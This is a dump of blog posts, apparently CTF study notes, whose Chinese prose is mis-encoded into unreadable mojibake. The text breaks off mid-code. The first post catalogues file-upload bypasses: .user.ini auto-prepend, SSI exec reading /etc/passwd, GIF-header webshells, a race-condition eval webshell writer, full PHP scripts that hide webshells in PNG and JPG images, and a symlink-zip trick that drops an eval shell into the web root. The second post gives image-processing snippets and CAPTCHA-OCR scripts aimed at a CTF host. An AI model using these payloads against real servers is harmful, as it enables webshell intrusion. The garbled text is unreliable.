æ¡ä»¶ï¼š a. æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP b. æœåŠ¡å™¨ä½¿ç”¨CGIï¼FastCGIæ¨¡å¼ c. ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶ å®ä¾‹ï¼š ä¸Šä¼ .user.iniç»•è¿‡é»‘åå•æ£€éªŒ 123GIF89a //ç»•è¿‡exif_imagetype()auto_prepend_file=a.jpg //æŒ‡å®šåœ¨ä¸»æ–‡ä»¶ä¹‹å‰è‡ªåŠ¨è§£æçš„æ–‡ä»¶çš„åç§°ï¼Œå¹¶åŒ…å«è¯¥æ–‡ä»¶ï¼Œå°±åƒä½¿ç”¨requireå‡½æ•°è°ƒç”¨å®ƒä¸€æ ·ã€‚auto_append_file=a.jpg //è§£æåè¿›è¡ŒåŒ…å« ä¼˜åŠ¿ï¼š è·Ÿ.htaccessåé—¨æ¯”ï¼Œé€‚ç”¨èŒƒå›´æ›´å¹¿ï¼Œnginx/apache/IISéƒ½æœ‰æ•ˆï¼Œè€Œ.htaccessåªé€‚ç”¨äºapache è¶…é•¿æ–‡ä»¶åæˆªæ–­ä¸Šä¼  windows - 258byte | linux - 4096byte ä½¿ç”¨./æˆ–. shtmlï¼ˆSSIæ³¨å…¥ï¼‰ å½“WebæœåŠ¡å™¨ä¸ºApacheå’ŒIISï¼ˆæ”¯æŒSSIåŠŸèƒ½çš„æœåŠ¡å™¨ï¼‰ä¸”å¼€å¯äº†SSIä¸CGIæ”¯æŒ &lt;!--#exec cmd=&quot;dir /&quot;--&gt; &lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt; â€‹ åç¼€åç™½åå•æ ¡éªŒ é…åˆApacheçš„è§£æç¼ºé™· Apacheçš„è§£ææ¼æ´ä¸»è¦ç‰¹æ€§æ˜¯ä»åé¢å¼€å§‹æ£€æŸ¥åç¼€ï¼ŒæŒ‰æœ€åä¸€ä¸ªåˆæ³•åç¼€ â€‹ å†…å®¹å¤´æ ¡éªŒ ç»•è¿‡æ–¹æ³• åœ¨æ¶æ„è„šæœ¬å‰åŠ ä¸Šå…è®¸ä¸Šä¼ æ–‡ä»¶çš„å¤´æ ‡è¯† å¦‚æ·»åŠ GIFå¤´ï¼š 12GIF89a&lt;?php phpinfo(); ?&gt; â€‹ ç«äº‰ä¸Šä¼  æƒ…æ™¯ æ–‡ä»¶ä¸Šä¼ åï¼Œæ£€æµ‹æ˜¯å¦åˆæ³•ï¼Œä¸åˆæ³•å°±åˆ é™¤ åˆ©ç”¨æ–¹å¼ åœ¨åˆ é™¤å‰è®¿é—®åˆ°ä¸Šä¼ çš„æ–‡ä»¶ 12345&lt;?php$file = &#x27;web.php&#x27;;$shell = &#x27;&lt;?php eval($_POST[&quot;key&quot;])?&gt;&#x27;;file_put_contents($file,$shell);?&gt; ä¾‹å­ https://github.com/backlion/demo/blob/master/lfi_phpinfo.py â€‹ phpå´©æºƒå¯¼è‡´tmpæ–‡ä»¶ä¿ç•™å½“å­˜åœ¨includeçš„æ—¶å€™ï¼Œä¼ å…¥file=php://filter/string.strip_tags/resource=/etc/passwdä¼šå¯¼è‡´Segment Faultï¼Œè¿™æ ·å¦‚æœåœ¨æ­¤åŒæ—¶ä¸Šä¼ æ–‡ä»¶ï¼Œé‚£ä¹ˆä¸´æ—¶æ–‡ä»¶å°±ä¼šè¢«ä¿å­˜åœ¨/tmpç›®å½•ï¼Œä¸ä¼šè¢«åˆ é™¤ã€‚ä½†æ˜¯è¿™æ—¶è¿˜éœ€è¦çŸ¥é“/tmpç›®å½•ä¸‹çš„æ–‡ä»¶åã€‚ â€‹ è¿‡æ»¤&lt;?æˆ–php jsæ ‡ç­¾ç»•è¿‡ éœ€è¦phpå°äº7.0 12345&lt;script language=&quot;PHP&quot;&gt;$fh=fopen(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;),&#x27;r&#x27;);echo fread($fh,filesize(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;)));fclose($fh);&lt;/script&gt; PHPçŸ­æ ‡ç­¾ å¼€å¯çŸ­æ ‡ç­¾å³short_open_tag=onæ—¶ï¼Œå¯ä»¥ä½¿ç”¨&lt;?=$_ ?&gt;è¾“å‡ºå˜é‡ï¼Œåœ¨PHP 5.4 ä¹‹åé»˜è®¤æ”¯æŒ â€‹ pharååºåˆ—åŒ–æ¼æ´è§pharååºåˆ—åŒ–ã€‚ â€‹ äºŒæ¬¡æ¸²æŸ“å›¾ç‰‡é©¬çš„ä¸‰ç§å¸¸ç”¨å›¾åƒæ ¼å¼gifï¼Œpngï¼Œjpgã€‚ ç®€å•å›¾ç‰‡é©¬ copy 1.jpg/b + 1.php/a 2.jpg äºŒæ¬¡æ¸²æŸ“ç»•è¿‡ gif å¯¹äºgifå›¾ç‰‡ï¼Œgifå›¾ç‰‡çš„ç‰¹ç‚¹æ˜¯æ— æŸï¼ˆä¿®æ”¹å›¾ç‰‡åï¼Œå›¾ç‰‡è´¨é‡å‡ ä¹æ²¡æœ‰æŸå¤±ï¼‰ï¼Œå¯ä»¥å¯¹æ¯”ä¸Šä¼ å‰åå›¾ç‰‡çš„å†…å®¹å­—èŠ‚ï¼Œåœ¨æ¸²æŸ“åä¸ä¼šè¢«ä¿®æ”¹çš„éƒ¨åˆ†æ’å…¥æœ¨é©¬ã€‚å¯¹æ¯”å·¥å…·å¯ä»¥ä½¿ç”¨burpï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨010ç¼–è¾‘å™¨ã€‚ png å¯¹äºpngå›¾ç‰‡ï¼Œä¿®æ”¹éš¾åº¦å¤§ä¸€ç‚¹ï¼Œä½¿ç”¨ä¸€ä¸ªè„šæœ¬æ¥ç”Ÿæˆï¼ŒåŸç†æ˜¯é€šè¿‡çœŸå®åƒç´ çš„äºŒè¿›åˆ¶è§£æå†™å…¥æ•°æ®æ®µã€‚ 12345678910111213141516171819202122&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,&#x27;./1.png&#x27;);?&gt; è¿è¡Œè„šæœ¬å³å¯ç”Ÿæˆï¼Œè¿™é‡Œçš„ä¸€å¥è¯æœ¨é©¬æ˜¯ï¼š &lt;?$_GET[0]($_POST[1]);?&gt; ä½¿ç”¨æ–¹å¼æ˜¯getä¼ å‚0ï¼ŒåŠ ä¸Špostä¼ å‚1ã€‚ jpg ç”±äºjpgå›¾ç‰‡æ˜“æŸï¼Œå¯¹å›¾ç‰‡çš„é€‰å–æœ‰å¾ˆå¤§å…³ç³»ï¼Œå¾ˆå®¹æ˜“åˆ¶ä½œå¤±è´¥ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145&lt;?php $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;; if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123; die(&#x27;php-gd is not installed&#x27;); &#125; if(!isset($argv[1])) &#123; die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;); &#125; set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die(&#x27;Incorrect SOI marker&#x27;); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123; die(&#x27;Success!&#x27;); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink(&#x27;payload_&#x27;.$argv[1]); die(&#x27;Something\\&#x27;s wrong&#x27;); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&#x27;/(\\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = &#x27;&#x27;; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die(&#x27;End Of File&#x27;); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die(&#x27;End Of File&#x27;); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125;?&gt; è¿è¡Œè„šæœ¬å‘½ä»¤ï¼š jpg_payload.php 1.jpg â€‹ è½¯é“¾æ¥æ”»å‡»ä»»æ„è¯»ï¼ˆunzipï¼‰unzip()å­˜åœ¨è½¯é“¾æ¥æ”»å‡»ï¼Œå‘ç°å¯ä»¥é€šè¿‡ä¸Šä¼ ä¸€ä¸ªè½¯é“¾æ¥çš„å‹ç¼©åŒ…ï¼ŒæŠŠç‰¹å®šæ–‡ä»¶åƒä¸ªé’©å­ä¸€æ ·å‹¾å‡ºæ¥ï¼Œå®ç°ä»»æ„æ–‡ä»¶è¯»å–ï¼š 123ln -s // linuxçš„è½¯é“¾æ¥ ç±»ä¼¼å¿«æ·æ–¹å¼ln -s /etc/passwd forever404 //ä¼šå‡ºç°ä¸€ä¸ªforever404æ–‡æœ¬ é‡Œé¢åŒ…å«æœ‰å¯†ç /proc/self // è®°å½•ç³»ç»Ÿè¿è¡Œçš„ä¿¡æ¯çŠ¶æ€ cwdæŒ‡å‘å½“å‰è¿›ç¨‹è¿è¡Œç›®å½•çš„ä¸€ä¸ªç¬¦å·é“¾æ¥ å³Flaskè¿è¡Œè¿›ç¨‹ç›®å½• æ“ä½œæ–¹å¼ å…ˆæ„é€ ä¸€ä¸ªæŒ‡å‘ /var/www/html çš„è½¯è¿æ¥ï¼š 12ln -s /var/www/html testzip --symlinks test.zip ./* æ­¤æ—¶ä¸Šä¼ è¯¥test.zipï¼Œè§£å‹å‡ºé‡Œè¾¹çš„æ–‡ä»¶ä¹Ÿæ˜¯è½¯è¿æ¥ /var/www/html ç›®å½•ä¸‹ï¼› æ¥ä¸‹æ¥çš„æ€è·¯å°±æ˜¯æƒ³åŠæ³•æ„é€ ä¸€ä¸ªgetshellæ–‡ä»¶è®©getshellæ–‡ä»¶æ­£å¥½è§£å‹åœ¨ /var/www/htmlï¼Œæ­¤æ—¶å°±å¯ä»¥getshellã€‚ æ„é€ ç¬¬äºŒä¸ªå‹ç¼©åŒ…ï¼Œå…ˆåˆ›å»ºä¸€ä¸ªtestç›®å½•ï¼ˆå› ä¸ºä¸Šä¸€ä¸ªå‹ç¼©åŒ…é‡Œè¾¹ç›®å½•å°±æ˜¯testï¼‰ï¼Œåœ¨testç›®å½•ä¸‹å†™ä¸€ä¸ªshellæ–‡ä»¶ï¼Œåœ¨å‹ç¼©åˆ›å»ºçš„testç›®å½• æ­¤æ—¶å‹ç¼©åŒ…ç›®å½•æ¶æ„æ˜¯ï¼štest/cmd.phpã€‚ 12345mkdir testcd testecho &quot;&lt;?php @eval($_GET[cmd]);&quot; &gt; cmd.phpcd ..zip -r test1.zip ./* å½“ä¸Šä¼ è¿™ä¸ªå‹ç¼©åŒ…æ—¶ä¼šè¦†ç›–ä¸Šä¸€ä¸ªtestç›®å½•ï¼Œä½†æ˜¯testç›®å½•è½¯é“¾æ¥æŒ‡å‘ /var/www/htmlï¼Œè§£å‹çš„æ—¶å€™ä¼šæŠŠcmd.phpæ”¾åœ¨ /var/www/htmlï¼Œæ­¤æ—¶è¾¾åˆ°äº†getshellçš„ç›®çš„ã€‚ â€‹ åªè§£å‹ä¸€åŠçš„å‹ç¼©åŒ…ï¼ˆè§£å‹ä¸€åŠå‡ºé”™ï¼‰ Windows 7zip 7zipçš„å®¹å¿åº¦å¾ˆä½ï¼Œåªè¦å‹ç¼©åŒ…ä¸­æŸä¸€ä¸ªæ–‡ä»¶çš„CRCæ ¡éªŒç å‡ºé”™ï¼Œå°±ä¼šæŠ¥é”™é€€å‡ºã€‚ ä¿®æ”¹æ–¹æ³•ï¼š å‡†å¤‡ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªPHPæ–‡ä»¶1.phpï¼Œä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶2.txtï¼Œå…¶ä¸­1.phpè¯´webshellï¼Œç„¶åå°†è¿™ä¸¤ä¸ªæ–‡ä»¶å‹ç¼©æˆshell.zipã€‚ ç”¨010editoræ‰“å¼€shell.zipï¼Œå¯ä»¥çœ‹åˆ°å³ä¸‹è§’æœ‰è¿™ä¸ªæ–‡ä»¶çš„æ ¼å¼ä¿¡æ¯ï¼Œå®ƒè¢«åˆ†æˆ5éƒ¨åˆ†ï¼Œæ‰“å¼€ç¬¬4éƒ¨åˆ†ï¼Œå…¶ä¸­æœ‰ä¸ªdeCrcï¼Œéšä¾¿æŠŠå€¼æ”¹æˆå…¶ä»–çš„å€¼ï¼Œç„¶åä¿å­˜ã€‚ æ­¤æ—¶ç”¨7zipè§£å‹å°±ä¼šå‡ºé”™ï¼Œè§£å‹å‡ºçš„1.phpæ˜¯å®Œå¥½çš„ï¼Œ2.txtæ˜¯ä¸€ä¸ªç©ºæ–‡ä»¶ã€‚ PHP ZipArchiveåº“ ZipArchiveå®¹å¿åº¦æ¯”è¾ƒé«˜ï¼Œå¯ä»¥åœ¨æ–‡ä»¶åä¸Šä¸‹åŠŸå¤«ã€‚ æ¯”å¦‚ï¼ŒWindowsä¸‹ä¸å…è®¸æ–‡ä»¶åä¸­åŒ…å«å†’å·ï¼ˆ:ï¼‰ï¼Œå¯ä»¥åœ¨010editorä¸­å°†2.txtçš„deFileNameå±æ€§çš„å€¼æ”¹æˆ2.tx:ï¼Œæ­¤æ—¶è§£å‹å°±ä¼šå‡ºé”™ï¼Œä½†1.phpè¢«ä¿ç•™äº†ä¸‹æ¥ã€‚ åœ¨Linuxä¸­ä¹Ÿæœ‰ç±»ä¼¼çš„æ–¹æ³•ï¼Œå¯ä»¥å°†æ–‡ä»¶åæ”¹ä¸º5ä¸ªæ–œæ ï¼ˆ/////ï¼‰ï¼Œæ­¤æ—¶Linuxä¸‹è§£å‹ä¹Ÿä¼šå‡ºé”™ï¼Œä½†1.phpè¢«ä¿ç•™äº†ä¸‹æ¥ã€‚","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"https://lazzzaro.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"author":"Lazzaro"},{"title":"å›¾åƒå¤„ç†","slug":"misc-å›¾åƒå¤„ç†","date":"2020-05-06T12:56:42.000Z","updated":"2023-03-28T14:56:28.341Z","comments":true,"path":"2020/05/06/misc-å›¾åƒå¤„ç†/","permalink":"https://lazzzaro.github.io/2020/05/06/misc-%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/","excerpt":"","text":"â€‹ Pillow12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#åŸºæœ¬æ“ä½œfrom PIL import Image #å¼•ç”¨Imageç±»im = Image.new(&#x27;RGB&#x27;,(110,80)) #æ–°å»ºå›¾ç‰‡im = Image.open(&#x27;x.jpg&#x27;) #åŠ è½½å›¾ç‰‡print(im.format,im.size,im.mode) #format-æ ¼å¼ï¼Œsize-(å®½&amp;é«˜)ï¼Œmode-æ¨¡å¼im.show() #å‘ˆç°å›¾ç‰‡im.getcolors() #è·å–å›¾ç‰‡ä¿¡æ¯ï¼Œä¸€èˆ¬ä¼šè¿”å›ä¸€ä¸ªå…ƒç»„(count,(r,g,b))ã€‚è¯¥å…ƒç»„ç¬¬ä¸€ä¸ªå…ƒç´ count ä»£è¡¨è¯¥é¢œè‰²åƒç´ å‡ºç°çš„æ¬¡æ•°ï¼Œç¬¬äºŒä¸ªå…ƒç´ è¡¨ç¤º(rgb)ã€‚im.convert(&#x27;RGB&#x27;).getpixel((0,0)) #è·å–åƒç´ ç‚¹çš„RGBå€¼Image.save(&#x27;y.png&#x27;) #ä¿å­˜æ–‡ä»¶#å›¾ç‰‡å‰ªåˆ‡#boxæ˜¯ä¸€ä¸ª4å…ƒçš„åæ ‡æ•°ç»„ï¼Œåæ ‡è½´æ˜¯å·¦ä¸Šè§’æ˜¯(0,0)çš„å¡è¿ªå°”åæ ‡ç³»ã€‚å‡è®¾boxæ˜¯(x1,y1,x2,y2)ï¼Œåˆ™æ‰€å–åŒºåŸŸæ˜¯ä»¥å„è‡ªåæ ‡åˆ’çº¿æ‰€å›´çš„åŒºåŸŸã€‚im = Image.open(&#x27;x.jpg&#x27;)box = (150,150,245,280)region = im.crop(box)region.show()#å›¾ç‰‡ç²˜è´´#å°†ä¸€å¼ å›¾è¦†ç›–åˆ°å¦ä¸€å¼ å›¾ä¸Šé¢ã€‚æ ¼å¼ä¸ºï¼špaste(è¦è´´çš„å›¾ç‰‡ï¼Œè¦è´´çš„å›¾ç‰‡çš„4å…ƒåæ ‡ç»„æˆçš„åŒºåŸŸ)ã€‚im = Image.open(&#x27;x.jpg&#x27;)box = (50,50,200,200)region = im.crop(box)# å°†å›¾ç‰‡é€†åºæ—‹è½¬180åï¼Œé»è´´åˆ°åŸæ¥å¤åˆ¶çš„ä½ç½® region = region.transpose(Image.ROTATE_180)im.paste(region,box)im.show()#å›¾åƒåºåˆ—#å½“å¤„ç†GIFè¿™ç§åŒ…å«å¤šä¸ªå¸§çš„å›¾ç‰‡ï¼Œç§°ä¹‹ä¸ºåºåˆ—æ–‡ä»¶ï¼ŒPILä¼šè‡ªåŠ¨æ‰“å¼€åºåˆ—æ–‡ä»¶çš„ç¬¬ä¸€å¸§ã€‚è€Œä½¿ç”¨seekå’Œtellæ–¹æ³•å¯ä»¥åœ¨ä¸åŒå¸§ç§»åŠ¨ã€‚tellæ˜¯å¸§æ•°ï¼Œè€Œseekæ˜¯å–å½“å‰å¸§æ•°çš„å›¾ç‰‡ã€‚from PIL import Imageim = Image.open(&quot;laopo.gif&quot;)im.seek(1)im.show()try: while 1: im.seek(im.tell()+1) im.show()except EOFError: pass#è¯»å–/ä¿®æ”¹åƒç´ from PIL import Imageimg = Image.open(&#x27;x.jpg&#x27;)width , height = img.sizefor i in range(0,width): for j in range(0,height): tmp = img.getpixel((i,j)) img.putpixel((i,j),(0,0,tmp[2]))img.show() â€‹ OpenCV21234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#å›¾åƒè¯»å…¥import cv2img = cv2.imread(r&#x27;x.jpg&#x27;,0)#å›¾åƒæ˜¾ç¤ºcv2.imshow(&#x27;tupian&#x27;,img)cv2.waitKey()#å›¾åƒä¿å­˜cv2.imwrite(&#x27;tupian,jpg&#x27;,img)#å›¾åƒå±æ€§print(img.shape) #shape è¿”å›å›¾åƒè¡Œæ•°ã€åˆ—æ•°ã€é€šé“æ•°print(img.size) #size è¿”å›å›¾åƒåƒç´ æ•°print(img.dtype) #dtype è¿”å›å›¾åƒçš„æ•°æ®ç±»å‹#é€šé“æ‹†åˆ†/åˆå¹¶#æ‹†åˆ†ä¸ºBã€Gã€Rä¸‰ä¸ªé€šé“#ç´¢å¼•æ‹†åˆ†B = img[:,:,0]G = img[:,:,1]R = img[:,:,2]#å‡½æ•°æ‹†åˆ†B,G,R = cv2.split(img)#åˆå¹¶bgr = cv2.merge([b,g,r])#ç±»å‹è½¬æ¢#å°†BGRæ¨¡å¼è½¬æ¢ä¸ºç°åº¦å›¾åƒï¼Œå†å°†ç°åº¦å›¾åƒè½¬æ¢ä¸ºRGBæ¨¡å¼import cv2import numpy as npbgr=np.random.randint(0,256,size=[2,4,3],dtype=np.uint8) #ç”Ÿæˆ2Ã—4Ã—3çš„BGRå›¾åƒgray=cv2.cvtColor(bgr,cv2.COLOR_BGR2GRAY) #BGRå›¾åƒè½¬æ¢ä¸ºç°åº¦å›¾åƒrgb=cv2.cvtColor(gray,cv2.COLOR_GRAY2RGB) #ç°åº¦å›¾åƒè½¬æ¢ä¸ºRGBå›¾åƒprint(&#x27;bgr=\\n&#x27;,bgr)print(&#x27;gray=\\n&#x27;,gray)print(&#x27;rgb=\\n&#x27;,rgb)# åœ¨RGBè‰²å½©ç©ºé—´çš„åŸºç¡€ä¸Šï¼Œè¿˜å¯ä»¥åŠ ä¸€ä¸ªAé€šé“ï¼Œå«åšAlphaé€šé“ï¼Œæ­¤æ—¶åŸå›¾åƒç±»å‹è½¬å˜ä¸ºRGBAæ¨¡å¼ï¼Œä¾‹å¦‚å¸¸è§çš„PNGç±»å‹å›¾åƒå°±æ˜¯RGBAè‰²å½©ç©ºé—´çš„ã€‚#åˆ†æalphaé€šé“çš„å€¼import cv2import numpy as npimg=np.random.randint(0,256,size=[2,3,3],dtype=np.uint8) #ç”Ÿæˆ2Ã—3Ã—3çš„BGRå›¾åƒbgra=cv2.cvtColor(img,cv2.COLOR_BGR2BGRA)print(&#x27;img=\\n&#x27;,img)print(&#x27;bgra=\\n&#x27;,bgra)b,g,r,a=cv2.split(bgra)print(&#x27;a=\\n&#x27;,a)a[:,:]=125bgra=cv2.merge([b,g,r,a])print(&#x27;bgra=\\n&#x27;,bgra)#å‚…é‡Œå¶å˜æ¢img = cv2.imread(r&quot;x.jpg&quot;,0)# å›¾åƒæ•°æ®è¦è½¬æ¢æˆfloat32img_float32 = np.float32(img)#è¿›è¡Œå‚…é‡Œå¶å˜æ¢dft = cv2.dft(img_float32,flags = cv2.DFT_COMPLEX_OUTPUT)# å°†ä½é¢‘ä¿¡æ¯è½¬æ¢è‡³å›¾åƒä¸­å¿ƒdft_shift = np.fft.fftshift(dft)# å‚…é‡Œå¶å˜æ¢åçš„æ•°æ®æ˜¯ç”±å®éƒ¨è™šéƒ¨æ„æˆçš„ï¼Œéœ€è¦è¿›è¡Œè½¬æ¢æˆå›¾åƒæ ¼å¼æ‰èƒ½æ˜¾ç¤º(0,255)magnitude = 20*np.log(cv2.magnitude(dft_shift[:,:,0],dft_shift[:,:,1]))plt.subplot(121),plt.imshow(img,cmap = &#x27;gray&#x27;)plt.subplot(122),plt.imshow(magnitude,cmap=&#x27;gray&#x27;)plt.show() â€‹ Matplotlib123456789101112131415161718192021222324252627#æ˜¾ç¤ºå›¾ç‰‡import matplotlib.pyplot as pltimport matplotlib.image as mpimgimport numpy as nppicture = mpimg.imread(&#x27;x.jpg&#x27;) # è¯»å–å’Œä»£ç å¤„äºåŒä¸€ç›®å½•ä¸‹çš„å›¾ç‰‡plt.imshow(picture) # æ˜¾ç¤ºå›¾ç‰‡plt.axis(&#x27;on&#x27;) # æ˜¾ç¤ºåæ ‡è½´plt.show() #å› ä¸ºidleæ˜¯pycharmæ‰€ä»¥å¤šä¸€è¡Œæ˜¾ç¤ºå‘½ä»¤#æ˜¾ç¤ºRGBæŸä¸ªé€šé“lena1 = picture*[0,0,1] # æ˜¾ç¤ºå›¾ç‰‡çš„ä¸€ä¸ªé€šé“lena2 = picture*[1,0,0]lena3 = picture*[0,1,0]#RGBè½¬ç°åº¦def rgb2gray2(rgb): r, g, b = rgb[:,:,0], rgb[:,:,1], rgb[:,:,2] #æ•°ç»„åˆ‡ç‰‡ gray = 0.2989 * r + 0.5870 * g + 0.1140 * b return graygray_pro = rgb2gray2(picture)plt.imshow(gray_pro,cmap = plt.get_cmap(&#x27;gray&#x27;))plt.axis(&#x27;on&#x27;) # æ˜¾ç¤ºåæ ‡è½´plt.show()#ä¿å­˜å›¾ç‰‡plt.savefig(&#x27;xx.jpg&#x27;) â€‹ OCRéªŒè¯ç  123456789101112131415161718192021222324252627282930313233343536373839404142import osimport timeimport refrom PIL import Imageimport ddddocrimport onnxruntimeimport requestsfrom base64 import b64decodeurl = &quot;http://&quot;sess = requests.Session()ocr = ddddocr.DdddOcr(use_gpu=True)onnxruntime.set_default_logger_severity(3)def pic_to_text(text): img = re.findall(r&quot;base64,(.*?)&gt;&quot;, text)[0] open(&quot;v_code_LA.png&quot;, &quot;wb&quot;).write(b64decode(img.encode())) v_code = Image.open(&quot;v_code_LA.png&quot;) v_code.convert(&quot;L&quot;) v_code.save(&quot;v_code.png&quot;) v_code_bytes = open(&#x27;v_code.png&#x27;, &#x27;rb&#x27;).read() code = ocr.classification(v_code_bytes) os.remove(&quot;v_code.png&quot;) return code.lower()def validate(text): cnt = int(re.findall(r&quot;done (.*?) times&quot;, text)[0]) if cnt == 1000: print(text) return code = pic_to_text(text) if len(code) != 4: return data = &#123; &quot;v_code&quot;: code &#125; sess.post(url,data)if __name__ == &quot;__main__&quot;: while 1: res = sess.get(url) validate(res.text) time.sleep(2) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182# ç™¾åº¦APIfrom urllib import responseimport requestsimport base64url = &quot;http://47.97.127.1:28583/&quot;def getToken(): token_url = url + &quot;/getToken&quot; response = requests.get(token_url) return response.json()[&#x27;data&#x27;][&#x27;token&#x27;]def ocr(img_base64): # client_id ä¸ºå®˜ç½‘è·å–çš„AKï¼Œ client_secret ä¸ºå®˜ç½‘è·å–çš„SK host = &#x27;https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&amp;client_id=ã€ä½ çš„ã€‘&amp;client_secret=ã€ä½ çš„ã€‘&#x27; response = requests.get(host) token = response.json()[&#x27;access_token&#x27;] &#x27;&#x27;&#x27; é€šç”¨æ–‡å­—è¯†åˆ«ï¼ˆé«˜ç²¾åº¦ç‰ˆï¼‰ &#x27;&#x27;&#x27; request_url = &quot;https://aip.baidubce.com/rest/2.0/ocr/v1/accurate_basic&quot; params = &#123;&quot;image&quot;:img_base64&#125; access_token = token request_url = request_url + &quot;?access_token=&quot; + access_token headers = &#123;&#x27;content-type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;&#125; response = requests.post(request_url, data=params, headers=headers) return response.json()[&#x27;words_result&#x27;]def getViolWords(): words_url = url + &quot;/getViolWords&quot; response = requests.get(words_url) return response.json()[&#x27;data&#x27;][&#x27;violWords&#x27;] def getPic(token): pic_url = url + &quot;/getPic&quot; data = &#123;&quot;token&quot;:token&#125; response = requests.post(pic_url,json=data) return response.json()[&#x27;data&#x27;][&#x27;words&#x27;][&#x27;w1&#x27;]def checkWords(violWords,picWords): try: picWords = picWords[0][&#x27;words&#x27;] except: pass print(picWords) for i in violWords: if i.replace(&quot; &quot;,&#x27;&#x27;).strip() in picWords: return False return Truedef submit(token,answer): submit_url = url + &quot;/submits&quot; data = 